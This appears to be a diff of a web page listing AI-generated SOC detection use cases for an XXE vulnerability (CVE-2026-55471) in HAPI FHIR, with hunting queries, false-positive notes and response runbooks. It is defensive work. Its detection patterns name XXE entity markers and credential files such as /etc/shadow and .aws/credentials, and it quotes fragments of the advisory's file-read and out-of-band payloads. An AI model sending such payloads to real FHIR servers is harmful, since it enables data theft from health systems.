+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] JVM DNS lookup for fresh external domain within 10s of inbound FHIR POST · Beaconing — periodic outbound to small set of destinations</em></div>
+<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] JVM process outbound to non-allow-listed external host (XXE OOB exfil callback)</em></div></div>
 </div>
-  <div class="usecases"><details class="uc" data-uc-slug="a53f632cf4" data-platforms="cloudwatch,datadog,def,sent,sigma,spl" data-targets="vcs,windows" open>
+  <div class="usecases"><details class="uc" data-uc-slug="dea87f514e" data-platforms="def,sent,spl" data-targets="" open>
   <summary>
-    <span class="uc-title">XXE DOCTYPE/ENTITY payload posted to HAPI FHIR endpoint (CVE-2026-55471)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="a53f632cf4" title="Copy share link to this UC" aria-label="Copy share link">
+    <span class="uc-title">HAPI FHIR org.hl7.fhir.utilities &lt;= 6.9.8 vulnerable to CVE-2026-55471 XXE (asset inventory)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Weaponization</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="dea87f514e" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Hunts inbound HTTP POST/PUT traffic to HAPI FHIR endpoints (/fhir/, /hl7/fhir/) carrying XML bodies with DOCTYPE / ENTITY / SYSTEM declarations. Targets exploitation of XsltUtilities.saxonTransform&#x27;s unhardened net.sf.saxon.TransformerFactoryImpl, which resolves external general and parameter entities.
+    <div class="uc-desc">Surfaces every host running the vulnerable HAPI FHIR utilities library (Maven ca.uhn.hapi.fhir:org.hl7.fhir.utilities &lt;= 6.9.8) so the SOC can scope the other 4 hunts in this set and prioritise patching. The bug is the bare net.sf.saxon.TransformerFactoryImpl instantiation in XsltUtilities.java at lines 61, 91, 106 — version 6.9.8 is the latest affected release at time of advisory.
 
-Rationale: Anchored to article-specific strings: FHIR URL paths (the library is org.hl7.fhir.utilities), saxonTransform function name, and the textbook XXE DTD tokens (&lt;!DOCTYPE / &lt;!ENTITY / SYSTEM file:/http:). Requires reverse-proxy or WAF body capture to fire — endpoint EDR alone cannot see HTTP request bodies on a Java app.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-2f55-g35j-5jmf
-  • https://cwe.mitre.org/data/definitions/611.html
-  • https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Internal QA / interop test harnesses (Touchstone, Inferno) that legitimately send FHIR XML with DOCTYPE</li><li>Authorised pen tests (Burp/ZAP) probing FHIR endpoints</li><li>Federated FHIR gateways forwarding upstream DOCTYPE-prefixed payloads</li><li>Compliance scanners (Tenable, Qualys) hitting /fhir/ with XML XXE probes</li><li>Legitimate IG-package validators that embed DTDs inside the bundle</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (SrcIP in ((_GetWatchlist(&#x27;AuthorisedPenTestIPs&#x27;) | project IPAddress))) and not (UA has_any (&quot;Touchstone&quot;,&quot;Inferno&quot;,&quot;Tenable&quot;,&quot;Qualys&quot;,&quot;BurpSuite-Internal&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 — Triage: Pull the full HTTP request body from WAF/proxy/Tomcat access logs; confirm presence of &lt;!DOCTYPE/&lt;!ENTITY and any SYSTEM URI. Note source IP, FHIR endpoint, authenticated principal (if any). Check whether HAPI FHIR utilities version on the server is &lt;= 6.9.8. Step 2 — Contain: Block source IP at WAF; add ModSecurity/AWS-WAF rule rejecting any request body matching &lt;!ENTITY|SYSTEM\s+[&quot;&#x27;](file|http|https|ftp|jar|netdoc): to FHIR paths; coordinate emergency patch of org.hl7.fhir.utilities to fixed version. Step 3 — Hunt: From the Java process PID, pivot to (a) DeviceFileEvents/auditd for reads of /etc/passwd, /etc/shadow, application secrets and (b) outbound DNS/HTTP from the Java process to new external destinations in the next 60 minutes (OOB exfil). Review HAPI FHIR audit logs for any saxonTransform invocations on attacker-controllable inputs.</div></details>
+Rationale: Pulled the exact Maven coordinates (ca.uhn.hapi.fhir:org.hl7.fhir.utilities) and the affected range (&lt;= 6.9.8) directly from the advisory&#x27;s Affected Versions and Root Cause sections. The version regex `^(?:[0-5]\.|6\.[0-8]\.|6\.9\.[0-8])` covers every release up to and including 6.9.8 without catching 6.9.9+ once it ships. Joining DeviceInfo to flag IsInternetFacing makes the result list triage-able by exposure.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities.Vulnerabilities</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Test/dev hosts running deliberately pinned older HAPI FHIR builds for IG-package backwards-compatibility testing</li><li>TVM re-scan noise on inventory deltas after a fresh KB pull — same host reported twice</li><li>Docker images of HAPI JPA Server where the patched JAR is shaded into a fat-jar and TVM still reports the embedded version</li><li>Third-party FHIR appliances (validator gateways, ETL boxes) that embed org.hl7.fhir.utilities transitively and version-stamp the appliance build rather than the JAR</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where DeviceName !startswith &quot;lab-&quot; and DeviceName !startswith &quot;dev-&quot; and DeviceName !contains &quot;-test-&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: confirm the asset is an internet-exposed or partner-facing FHIR endpoint (HAPI JPA Server, FHIR validator, IG publisher); pull deployment manifest / pom.xml to verify the library version. 2) Contain: place WAF rules in front blocking XML payloads containing `&lt;!DOCTYPE` or `&lt;!ENTITY` against `/fhir/*`, `/baseDstu*`, `/baseR4*`, `/baseR5*`, `/hl7/fhir/*` paths and lock egress from the JVM to the documented terminology service allow-list (tx.fhir.org, terminology.hl7.org, loinc.org, snomed.org). 3) Hunt: pivot to UC2/UC3/UC4/UC5 over the past 30d on the same DeviceId/DeviceName to retro-check whether this asset was exploited before the inventory hit — focus on JVM outbound to anything outside the allow-list and DeviceFileEvents for the JVM touching sensitive paths.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-07-uc0-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-07-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-07-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-07-uc0-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-07-uc0-cloudwatch">CloudWatch Logs Insights</button>
       <button class="tab-btn" data-target="art-07-uc0-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc0-kql"><pre><button class="copy-btn">COPY</button><code>// Best-effort: only useful if FHIR server is a Defender-onboarded Windows host and a reverse-proxy writes XML payloads to disk for the Java process to read
-DeviceNetworkEvents
+    <div class="tab-content active" id="art-07-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceTvmSoftwareVulnerabilities
 | where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName has_any (&quot;java.exe&quot;,&quot;javaw.exe&quot;)
-| where RemoteUrl has_any (&quot;/fhir/&quot;,&quot;/hl7/fhir/&quot;,&quot;/baseR4/&quot;,&quot;/baseDstu&quot;)
-| where LocalPort in (8080, 8443, 80, 443, 9443)
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, LocalPort, ActionType
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>let FhirPaths = dynamic([&quot;/fhir/&quot;,&quot;/hl7/fhir/&quot;,&quot;/baseR4/&quot;,&quot;/baseDstu&quot;]);
-let XxeTokens = dynamic([&quot;&lt;!DOCTYPE&quot;,&quot;&lt;!ENTITY&quot;,&quot;SYSTEM \&quot;file:&quot;,&quot;SYSTEM \&quot;http:&quot;,&quot;SYSTEM &#x27;file:&quot;,&quot;SYSTEM &#x27;http:&quot;,&quot;% xxe&quot;,&quot;saxonTransform&quot;]);
-union isfuzzy=true
-(
-    CommonSecurityLog
-    | where TimeGenerated &gt; ago(7d)
-    | where RequestMethod in (&quot;POST&quot;,&quot;PUT&quot;)
-    | where RequestURL has_any (FhirPaths)
-    | where Message has_any (XxeTokens) or RequestContext has_any (XxeTokens) or AdditionalExtensions has_any (XxeTokens)
-    | extend SrcIP = SourceIP, DstHost = DestinationHostName, Url = RequestURL, UA = RequestClientApplication, Source = &quot;CEF&quot;
-    | project TimeGenerated, Source, SrcIP, DstHost, Url, RequestMethod, UA, Message
-),
-(
-    Syslog
-    | where TimeGenerated &gt; ago(7d)
-    | where ProcessName has_any (&quot;tomcat&quot;,&quot;java&quot;,&quot;jboss&quot;,&quot;wildfly&quot;,&quot;hapi&quot;,&quot;nginx&quot;,&quot;httpd&quot;,&quot;apache2&quot;)
-    | where SyslogMessage has_any (FhirPaths)
-    | where SyslogMessage has_any (XxeTokens)
-    | extend Source = &quot;Syslog&quot;, DstHost = Computer
-    | project TimeGenerated, Source, DstHost, ProcessName, SyslogMessage
-)
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: HAPI FHIR XXE Payload Posted to Saxon Transform Endpoint (CVE-2026-55471)
-id: 7a3b4c5d-8e9f-4a1b-bc2d-3e4f5a6b7c8d
-status: experimental
-description: Detects HTTP request bodies containing XXE DOCTYPE/ENTITY constructs posted to HAPI FHIR endpoints that route through XsltUtilities.saxonTransform.
-references:
-  - https://github.com/advisories/GHSA-2f55-g35j-5jmf
-author: SOC Detection Engineering
-date: 2026/06/18
-tags:
-  - attack.t1190
-  - attack.t1071.001
-logsource:
-  category: webserver
-detection:
-  selection_path:
-    cs-uri-stem|contains:
-      - &#x27;/fhir/&#x27;
-      - &#x27;/hl7/fhir/&#x27;
-      - &#x27;/baseR4/&#x27;
-      - &#x27;/baseDstu&#x27;
-  selection_body:
-    cs-body|contains:
-      - &#x27;&lt;!DOCTYPE&#x27;
-      - &#x27;&lt;!ENTITY&#x27;
-      - &#x27;SYSTEM &quot;file:&#x27;
-      - &#x27;SYSTEM &quot;http:&#x27;
-      - &#x27;saxonTransform&#x27;
-  condition: selection_path and selection_body
-falsepositives:
-  - Legitimate FHIR clients sending XML with internal-subset DOCTYPE
-  - Vulnerability scanners (Burp/ZAP/Acunetix) probing FHIR
-level: high</code></pre></div>
-    <div class="tab-content" id="art-07-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>(source:(nginx OR apache OR tomcat OR java) OR source:cloudfront) (@http.url:(*\/fhir\/* OR *\/hl7\/fhir\/* OR *\/baseR4\/* OR *\/baseDstu*)) @http.method:(POST OR PUT) (@http.request.body:(*\&lt;\!DOCTYPE* OR *\&lt;\!ENTITY* OR *SYSTEM*file\:* OR *SYSTEM*http\:* OR *saxonTransform*) OR @message:(*\&lt;\!DOCTYPE* OR *\&lt;\!ENTITY*))</code></pre></div>
-    <div class="tab-content" id="art-07-uc0-cloudwatch"><pre><button class="copy-btn">COPY</button><code># log group: /aws/wafv2 OR /aws/applicationelb (whichever fronts the FHIR server)
-fields @timestamp, httpRequest.clientIp, httpRequest.uri, httpRequest.httpMethod, action, terminatingRuleId, httpRequest.headers
-| filter httpRequest.uri like /\/fhir\//
-      or httpRequest.uri like /\/hl7\/fhir\//
-      or httpRequest.uri like /\/baseR4\//
-| filter httpRequest.httpMethod in [&quot;POST&quot;,&quot;PUT&quot;]
-| filter @message like /&lt;!DOCTYPE/ or @message like /&lt;!ENTITY/ or @message like /SYSTEM &quot;file:/ or @message like /SYSTEM &quot;http:/ or @message like /saxonTransform/
-| sort @timestamp desc
-| limit 200</code></pre></div>
-    <div class="tab-content" id="art-07-uc0-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.http_method) as method values(Web.src) as src values(Web.dest) as dest from datamodel=Web.Web where Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseDstu*&quot;) (Web.http_content_type=&quot;*xml*&quot; OR Web.http_user_agent=&quot;*xml*&quot;) by Web.src Web.dest Web.url Web.http_method Web.http_user_agent Web.http_content_length | `drop_dm_object_name(Web)` | where http_content_length &gt; 200 | search [search index=proxy OR index=waf OR index=tomcat (&quot;&lt;!DOCTYPE&quot; OR &quot;&lt;!ENTITY&quot; OR &quot;SYSTEM \&quot;file:&quot; OR &quot;SYSTEM \&quot;http:&quot; OR &quot;% &quot; OR &quot;saxonTransform&quot;) (&quot;/fhir/&quot; OR &quot;/hl7/fhir/&quot;) | stats values(src) as src by url | table src] | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-07-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.http_method) as method values(Web.src) as src values(Web.dest) as dest from datamodel=Web.Web where Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseDstu*&quot;) (Web.http_content_type=&quot;*xml*&quot; OR Web.http_user_agent=&quot;*xml*&quot;) by Web.src Web.dest Web.url Web.http_method Web.http_user_agent Web.http_content_length | `drop_dm_object_name(Web)` | where http_content_length &gt; 200 | search [search index=proxy OR index=waf OR index=tomcat (&quot;&lt;!DOCTYPE&quot; OR &quot;&lt;!ENTITY&quot; OR &quot;SYSTEM \&quot;file:&quot; OR &quot;SYSTEM \&quot;http:&quot; OR &quot;% &quot; OR &quot;saxonTransform&quot;) (&quot;/fhir/&quot; OR &quot;/hl7/fhir/&quot;) | stats values(src) as src by url | table src] | sort - lastTime</code></pre></div></div>
+| where CveId == &quot;CVE-2026-55471&quot;
+    or (SoftwareName has_any (&quot;org.hl7.fhir.utilities&quot;,&quot;hapi-fhir&quot;,&quot;ca.uhn.hapi.fhir&quot;)
+        and SoftwareVersion matches regex @&quot;^(?:[0-5]\.|6\.[0-8]\.|6\.9\.[0-8])&quot;)
+| join kind=leftouter (DeviceInfo | summarize arg_max(Timestamp, IsInternetFacing, PublicIP) by DeviceId) on DeviceId
+| project Timestamp, DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate, IsInternetFacing, PublicIP
+| order by IsInternetFacing desc, Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-07-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(7d)
+| where CveId == &quot;CVE-2026-55471&quot;
+    or (SoftwareName has_any (&quot;org.hl7.fhir.utilities&quot;,&quot;hapi-fhir&quot;,&quot;ca.uhn.hapi.fhir&quot;)
+        and SoftwareVersion matches regex @&quot;^(?:[0-5]\.|6\.[0-8]\.|6\.9\.[0-8])&quot;)
+| join kind=leftouter (DeviceInfo | summarize arg_max(TimeGenerated, IsInternetFacing, PublicIP) by DeviceId) on DeviceId
+| project TimeGenerated, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, IsInternetFacing, PublicIP
+| order by IsInternetFacing desc, TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-07-uc0-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=t count values(Vulnerabilities.severity) as severities values(Vulnerabilities.signature) as signatures min(_time) as firstTime max(_time) as lastTime from datamodel=Vulnerabilities.Vulnerabilities where Vulnerabilities.cve=&quot;CVE-2026-55471&quot; OR Vulnerabilities.signature=&quot;*org.hl7.fhir.utilities*&quot; OR Vulnerabilities.signature=&quot;*hapi*fhir*utilities*&quot; OR Vulnerabilities.signature=&quot;*ca.uhn.hapi.fhir*&quot; by Vulnerabilities.dest Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| convert ctime(firstTime) ctime(lastTime)
+| sort - lastTime</code></pre><pre class="spl-mode-body" id="art-07-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count values(Vulnerabilities.severity) as severities values(Vulnerabilities.signature) as signatures min(_time) as firstTime max(_time) as lastTime from datamodel=Vulnerabilities.Vulnerabilities where Vulnerabilities.cve=&quot;CVE-2026-55471&quot; OR Vulnerabilities.signature=&quot;*org.hl7.fhir.utilities*&quot; OR Vulnerabilities.signature=&quot;*hapi*fhir*utilities*&quot; OR Vulnerabilities.signature=&quot;*ca.uhn.hapi.fhir*&quot; by Vulnerabilities.dest Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| convert ctime(firstTime) ctime(lastTime)
+| sort - lastTime</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="c452f646e0" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+<details class="uc" data-uc-slug="f542db3f93" data-platforms="datadog,sent,sigma,spl" data-targets="vcs,web-app">
   <summary>
-    <span class="uc-title">Java/FHIR process reads sensitive local files after inbound XML POST (XXE file disclosure)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-title">XXE DOCTYPE/ENTITY payload in HTTP POST to HAPI FHIR endpoint</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="c452f646e0" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="f542db3f93" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Correlates inbound HTTP POST/PUT containing XXE payload markers to a FHIR endpoint with the FHIR Java process immediately reading sensitive system files (/etc/passwd, /etc/shadow, application.properties, AWS metadata, Windows hosts/win.ini). Catches the file-disclosure leg of the XsltUtilities.saxonTransform XXE chain.
+    <div class="uc-desc">Hunts inbound HTTP POST/PUT requests targeting HAPI FHIR endpoints (/fhir/, /baseDstu*, /baseR4/, /baseR5/, /hl7/fhir/) whose XML body contains DOCTYPE / ENTITY / SYSTEM markers — the direct exploitation primitive for CVE-2026-55471. Legitimate FHIR XML resources never declare external entities or DTDs; any DOCTYPE on the wire to a FHIR endpoint is article-specific weaponisation.
 
-Rationale: Article identifies XsltUtilities.saxonTransform at lines 60-73/90-99/105-128 of org.hl7.fhir.utilities, with the PoC reading a temp &#x27;canary&#x27; file via &lt;!ENTITY canary SYSTEM &quot;file:///...&quot;&gt;. The detection ties the FHIR Java process directly to canonical post-XXE file-disclosure targets — file paths and process-context strings come straight from the advisory and the PoC.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-2f55-g35j-5jmf
-  • https://attack.mitre.org/techniques/T1552/001/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="File and Directory Discovery">T1083</span> <span class="ind tech" title="Data from Local System">T1005</span> <span class="ind tech" title="Credentials In Files">T1552.001</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>HAPI FHIR service startup reading fhir-server-config legitimately</li><li>Backup agent (Veeam/Rubrik) traversing /opt/hapi/ during snapshot</li><li>Vulnerability scanner running locally on the FHIR host (Nessus agent reading /etc/passwd)</li><li>Sysadmin running &#x27;sudo -u tomcat cat /etc/passwd&#x27; for debugging</li><li>DevOps tooling (Ansible/Chef) reading application.yml during deploy</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessParentFileName in~ (&quot;systemd&quot;,&quot;init&quot;,&quot;upstart&quot;) and FolderPath endswith &quot;fhir-server-config.json&quot;) and not (InitiatingProcessCommandLine has_any (&quot;--bootstrap&quot;,&quot;--initdb&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 — Triage: Confirm the Java PID owns the FHIR listener; pull the inbound HTTP request that immediately preceded the file read (correlate within 60s on the host); look for &lt;!ENTITY ... SYSTEM &quot;file:...&quot;&gt; in the body. Step 2 — Contain: Isolate the host from the network; rotate any secrets accessible from the FHIR service account (/etc/shadow, AWS keys, DB creds in application.yml); take a memory image of the Java process. Step 3 — Hunt: Search the past 30 days of WAF/proxy logs for the same client IP posting &lt;!DOCTYPE to any FHIR endpoint; pivot to outbound connections from the Java PID to non-allowlisted hosts (parameter-entity OOB exfil); review HAPI audit logs for IG package imports or stylesheet downloads that could have triggered saxonTransform on attacker input.</div></details>
+Rationale: DOCTYPE / ENTITY / parameter-entity tokens against a FHIR endpoint are mechanically the article&#x27;s exploitation primitive — the advisory&#x27;s own PoC at lines `&lt;!ENTITY canary SYSTEM &quot;file://...&quot;&gt;` and `&lt;!ENTITY % oob SYSTEM &quot;http://...&quot;&gt;` map straight to these markers. Legitimate FHIR XML (per the spec) never declares external DTDs, so the FP floor is near-zero outside of conformance suites.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>FHIR conformance test suites (Touchstone, AEGIS) issuing XML payloads with declared internal DTDs from known scanner IPs</li><li>Internal HAPI FHIR test harnesses running the very PoC from this advisory against staging endpoints</li><li>Legacy CDA / CCDA bridges that wrap CDA documents (which legitimately carry DOCTYPE) inside a FHIR Binary resource</li><li>WAF training/test traffic where a red team is replaying XML payloads</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where SourceIP !in (&quot;&lt;conformance_scanner_cidr&gt;&quot;) and RequestClientApplication !has &quot;Touchstone&quot; and RequestClientApplication !has &quot;AEGIS&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull the full Message / body bytes from the matching CommonSecurityLog row and confirm the ENTITY declaration resolves to a file:// or external http(s):// URL — if it&#x27;s purely internal DTD subset content, downgrade. Pivot to UC1 to confirm the target host actually runs vulnerable HAPI FHIR. 2) Contain: drop the source IP at the edge WAF; add a temporary block rule on the FHIR ingress for any body containing `&lt;!DOCTYPE` or `&lt;!ENTITY` until the host is upgraded past 6.9.8. 3) Hunt: jump to UC3 (JVM outbound) and UC5 (JVM DNS) for the same target DeviceName over the next 60 minutes to confirm whether the OOB callback succeeded, and to UC4 if the body contained `&lt;!ENTITY %`.</div></details>
     <div class="tabs">
-      <button class="tab-btn active" data-target="art-07-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-07-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn active" data-target="art-07-uc1-sentinel">Sentinel KQL</button>
       <button class="tab-btn" data-target="art-07-uc1-sigma">Sigma</button>
       <button class="tab-btn" data-target="art-07-uc1-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-07-uc1-falcon">Falcon LogScale</button>
       <button class="tab-btn" data-target="art-07-uc1-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc1-kql"><pre><button class="copy-btn">COPY</button><code>let SensitiveFiles = dynamic([&quot;\\Windows\\win.ini&quot;,&quot;\\Windows\\System32\\drivers\\etc\\hosts&quot;,&quot;\\application.properties&quot;,&quot;\\application.yml&quot;,&quot;\\.aws\\credentials&quot;,&quot;\\.ssh\\id_rsa&quot;,&quot;\\hapi.properties&quot;,&quot;\\fhir-server-config&quot;]);
-DeviceFileEvents
-| where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;)
-| where InitiatingProcessCommandLine has_any (&quot;hapi&quot;,&quot;fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;XsltUtilities&quot;,&quot;saxon&quot;)
-   or InitiatingProcessParentFileName has_any (&quot;tomcat&quot;,&quot;jboss&quot;,&quot;wildfly&quot;,&quot;catalina&quot;)
-| where FolderPath has_any (SensitiveFiles)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileOpened&quot;,&quot;FileRenamed&quot;)
-   or AdditionalFields has &quot;Read&quot;
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCommandLine, FolderPath, FileName, ActionType
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>let SensitiveFiles = dynamic([&quot;/etc/passwd&quot;,&quot;/etc/shadow&quot;,&quot;/etc/hosts&quot;,&quot;application.properties&quot;,&quot;application.yml&quot;,&quot;.aws/credentials&quot;,&quot;id_rsa&quot;,&quot;hapi.properties&quot;,&quot;fhir-server-config&quot;,&quot;win.ini&quot;,&quot;\\drivers\\etc\\hosts&quot;]);
-ImFileEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventType in (&quot;FileAccessed&quot;,&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where ActingProcessName has_any (&quot;java&quot;,&quot;javaw&quot;,&quot;java.exe&quot;)
-| where ActingProcessCommandLine has_any (&quot;hapi&quot;,&quot;fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;XsltUtilities&quot;,&quot;saxon&quot;,&quot;tomcat&quot;,&quot;catalina&quot;)
-| where TargetFilePath has_any (SensitiveFiles)
-| project TimeGenerated, DvcHostname, ActingProcessName, ActingProcessId, ActingProcessCommandLine, TargetFilePath, EventType
+    <div class="tab-content active" id="art-07-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>CommonSecurityLog
+| where TimeGenerated &gt; ago(1d)
+| where RequestMethod in (&quot;POST&quot;,&quot;PUT&quot;)
+| where RequestURL has_any (&quot;/fhir/&quot;,&quot;/baseDstu&quot;,&quot;/baseR4&quot;,&quot;/baseR5&quot;,&quot;/hl7/fhir/&quot;)
+| where Message has_any (&quot;&lt;!DOCTYPE&quot;,&quot;&lt;!ENTITY&quot;,@&quot;SYSTEM &quot;&quot;file:&quot;,@&quot;SYSTEM &quot;&quot;http&quot;,@&quot;SYSTEM &quot;&quot;https&quot;,@&quot;SYSTEM &quot;&quot;ftp&quot;,&quot;&lt;!ENTITY %&quot;)
+    or AdditionalExtensions has_any (&quot;&lt;!DOCTYPE&quot;,&quot;&lt;!ENTITY&quot;)
